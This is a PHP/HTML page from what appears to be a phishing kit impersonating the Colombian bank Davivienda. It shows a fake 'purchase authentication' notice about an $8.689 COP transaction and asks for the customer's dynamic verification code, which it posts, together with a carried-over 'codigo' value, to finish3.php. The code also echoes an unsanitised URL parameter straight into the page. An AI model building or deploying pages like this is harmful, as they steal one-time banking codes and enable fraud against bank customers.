<?php 


    $codigo = $_GET['codigo'];
    $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop debe ser autorizada por seguridad";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/davi.css">
    <title>Document</title>
</head>
<body>
    <div class="details">
        <img src="/img/davi.png" alt="" srcset="" width="100px">
    <hr>
    <a style="color:black;">Autenticación de compra</a><p></p>
    <br><a style="color:black;">Davivienda le envío un código de confirmación para continuar con el proceso de compra. Por favor digítelo.</a><p></p>
    <br><a style="color:black;">Para recibir un nuevo código por favor haga click en REENVIAR CODIGO</a><br><br><br>

    <form action="finish3.php" method="post">
       
        <center><a style="">Código de verificación</a><br>
        <input type="hidden" value="<?php echo $codigo; ?>" name="numero">
        <input type="text" name="cDinamica" id="input" style="" required minlength="6"><br>
        <input type="submit" id="btn" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        </form>
        <p></p>
        <p>
            <br>
        </p>
        <center><a><b>REENVIAR CÓDIGO</b></a></center>
        <a><b>Necesita Ayuda?</b></a>
    </div>





<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    setTimeout(function() {
        $(".content").fadeIn(1500);
    },240000);


    setTimeout(function() {
        $(".details").fadeOut(1000);
    },240000);
    
});
</script>
</body>
</html>